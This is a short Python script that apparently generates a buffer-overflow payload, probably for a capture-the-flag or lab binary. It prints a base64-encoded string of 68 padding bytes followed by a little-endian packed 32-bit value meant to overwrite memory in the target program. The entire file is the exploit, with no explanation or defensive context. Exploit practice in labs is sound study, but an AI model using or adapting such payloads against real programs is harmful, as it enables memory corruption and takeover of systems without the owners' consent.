
import sys
import struct
import base64

buf = b'mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm'
buf += struct.pack('<I', 1472811567)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
